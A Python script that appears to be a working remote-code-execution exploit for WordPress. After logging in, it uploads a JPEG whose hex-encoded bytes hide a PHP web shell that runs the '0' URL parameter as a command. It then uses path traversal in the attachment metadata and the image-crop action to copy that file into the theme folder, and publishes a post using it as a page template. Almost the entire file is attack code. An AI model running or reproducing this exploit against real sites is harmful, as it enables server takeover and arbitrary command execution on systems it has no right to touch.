import argparse

import requests
import re
import random
from urllib.parse import urlparse
import json

session = requests.Session()
theme = "twentyseventeen"


def login(user: str, password: str):
    url = f"{host}/wp-login.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = f"log={user}&pwd={password}"

    response = session.post(url=url, headers=headers, data=payload, allow_redirects=False)

    if response.status_code != 302:
        print("Cant not login")
        exit(-1)


def getWpnonce():
    url = f"{host}/wp-admin/media-new.php"
    response = session.get(url=url)
    body = response.text
    json = re.search(r"\"post_id\":0,\"_wpnonce\":\"([\w\d]+)\",\"type\":\"\",\"tab\":\"\",\"short\":\"1\"", body)

    return json.group(1)


def create_image():
    image_hex_val = 'ffd8ffe000104a46494600010101006000600000ffed003850686f746f73686f7020332e30003842494d040400000000001c1c027400103c3f3d60245f4745545b305d603b3f3e1c020000020004fffe003b43524541544f523a2067642d6a7065672076312e3020287573696e6720494a47204a50454720763830292c207175616c697479203d2038320affdb0043000604040504040605050506060607090e0909080809120d0d0a0e1512161615121414171a211c17181f1914141d271d1f2223252525161c292c28242b21242524ffdb00430106060609080911090911241814182424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424ffc000110800c0010603012200021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a0bffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1f02433627282090a161718191a25262728292a3435363738393a434445464748494a535455565758595a636465666768696a737475767778797a838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffc4001f0100030101010101010101010000000000000102030405060708090a0bffc400b51100020102040403040705040400010277000102031104052131061241510761711322328108144291a1b1c109233352f0156272d10a162434e125f11718191a262728292a35363738393a434445464748494a535455565758595a636465666768696a737475767778797a82838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae2e3e4e5e6e7e8e9eaf2f3f4f5f6f7f8f9faffda000c03010002110311003f003c3f3d60245f4745545b305d603b3f3e'
    z = open('./payload.png', 'wb')
    z.write(bytes.fromhex(image_hex_val))
    z.close()


def getFileContent(uri: str):
    file = open(uri, "r+b")
    file_name = uri.split("/")[-1]
    content = file.read()
    file.close()
    return file_name, content


def upload_image():
    url = f"{host}/wp-admin/async-upload.php"

    file_name, content = getFileContent('./payload.png')

    wpnonce = getWpnonce()

    payload = {
        "_wpnonce": (None, wpnonce),
        "async-upload": (file_name, content, "image/jpeg")
    }

    response = session.post(url=url, files=payload, allow_redirects=False)

    if response.status_code != 200:
        print("Can not upload file")

    return int(response.text)


def update_attachment(id: int):
    url = f"{host}/wp-admin/post.php?post={id}&action=edit"
    response = session.get(url)
    body = response.text

    wpnonce_regex = r'<input type="hidden" id="_wpnonce" name="_wpnonce" value="(\w+)" /><input'
    wpnonce = re.search(wpnonce_regex, body).group(1)

    url_regex = r"name=\"attachment_url\" id=\"attachment_url\" value=\"(.+?)\" \/>"
    url = re.search(url_regex, body).group(1)

    file_name = urlparse(url).path.split("/")[-1]

    path = "/".join(urlparse(url).path.split("/")[3:])

    payload = {
        "_wpnonce": wpnonce,
        "action": "editpost",
        "post_ID": id,
        "post_title": "payload",
        "save": "Update",
        "meta_input[_wp_attached_file]": path + f"#/{file_name}"
    }

    # first create folder #{payload}
    session.post(f"{host}/wp-admin/post.php", data=payload)

    ajax_nonce_regex = fr'onclick=\'imageEdit.open\( {id}, "(\w+)" \)\''

    ajax_nonce = re.search(ajax_nonce_regex, body).group(1)

    url = crop(id=id, ajax_nonce=ajax_nonce)

    if not url:
        print("Can not update payload")

    # file traversal to upload file to any folder, this situation is themes folder
    payload = {
        "_wpnonce": wpnonce,
        "action": "editpost",
        "post_ID": id,
        "post_title": "payload",
        "save": "Update",
        "meta_input[_wp_attached_file]": path + f"#/../../../../themes/{theme}/{file_name}"
    }

    session.post(f"{host}/wp-admin/post.php", data=payload)

    url = crop(id=id, ajax_nonce=ajax_nonce)

    if not url:
        print("Can not update payload")

    return url.split("/")[-1]


def crop(id, ajax_nonce):
    payload = {
        "action": "image-editor",
        "_ajax_nonce": ajax_nonce,
        "postid": id,
        "history": "%5B%7B%22c%22%3A%7B%22x%22%3A0%2C%22y%22%3A0%2C%22w%22%3A262%2C%22h%22%3A192%7D%7D%5D",
        "target": "all",
        "context": "edit-attachment",
        "do": "save"
    }

    response = session.post(f"{host}/wp-admin/admin-ajax.php", data=payload)

    return json.loads(response.text)['thumbnail']


def create_post(payload_id):
    url = f"{host}/wp-admin/post-new.php"
    response = session.get(url=url)
    body = response.text

    wpnonce_regex = r"<input type=\"hidden\" id=\"_wpnonce\" name=\"_wpnonce\" value=\"(\w+)\""
    wpnonce = re.search(wpnonce_regex, body).group(1)

    id_regex = r"<input type='hidden' id='post_ID' name='post_ID' value='(\d+)'"
    id = re.search(id_regex, body).group(1)

    payload = {
        "_wpnonce": wpnonce,
        "action": "editpost",
        "post_status": "publish",
        "post_title": "bien rce",
        "post_ID": id,
        "meta_input[_wp_page_template]": payload_id
    }
    url = f"{host}/wp-admin/post.php"
    response = session.post(url=url, data=payload)

    return f"{host}/?p={id}&0=ls"


if __name__ == '__main__':

    parse = argparse.ArgumentParser(description="Check login user and password")
    parse.add_argument("--url", help="URL")
    parse.add_argument("--user", help="User")
    parse.add_argument("--password", help="Password")

    args = parse.parse_args()

    url = args.url
    user = args.user
    password = args.password

    host = url

    login(user, password)
    id = upload_image()
    id_poc = update_attachment(id)
    poc_url = create_post(id_poc)
    print(poc_url)
